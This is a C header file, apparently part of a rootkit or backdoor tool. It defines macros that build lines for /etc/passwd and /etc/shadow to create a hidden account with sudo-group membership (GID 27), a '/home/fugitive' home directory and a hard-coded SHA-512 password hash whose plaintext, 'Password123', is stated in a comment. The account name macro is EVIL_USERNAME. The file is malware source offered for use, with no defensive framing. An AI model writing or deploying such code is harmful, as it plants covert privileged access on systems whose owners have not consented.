#define PASSWD_PATH "/etc/passwd"
#define SHADOW_PATH "/etc/shadow"
#define GROUP_PATH "/etc/group"

// /etc/passwd fields besides username
#define PASSWD "x"
#define UID "666"   // random uid, below 1000 to avoid conflict with user accounts
#define GID "27"    // 27 is sudo group on ubuntu
#define FULLNAME ""
#define DIR "/home/fugitive"
#define SHELL "/bin/bash"

// /etc/shadow fields besides username, password is "Password123"
#define PASSWD_SHA512 "$6$xBoTg.km$PKitMe/Qn6K4yoO.wrBSwvdtqSOc3Bfb5Mcn7S\
sUito2AtUGPzE0JB/g/Li23t5Zp8YjKUOB9czKl3yMYJO35."
#define LAST "0"
#define MAY "0"
#define MUST "99999"
#define WARN_DAYS "7"
#define EXPIRE ""
#define DISABLE ""
#define RESERVED ""

// /etc/group fields

// generates string that can be inserted into passwd and shadow files
#define PASSWD_GEN() \
        EVIL_USERNAME ":" \
        PASSWD ":" \
        UID ":" \
        GID ":" \
        FULLNAME ":" \
        DIR ":" \
        SHELL "\n"

#define SHADOW_GEN() \
        EVIL_USERNAME ":" \
        PASSWD_SHA512 ":" \
        LAST ":" \
        MAY ":" \
        MUST ":" \
        WARN_DAYS ":" \
        EXPIRE ":" \
        DISABLE ":" \
        RESERVED "\n"
// #define GROUP_GEN() 
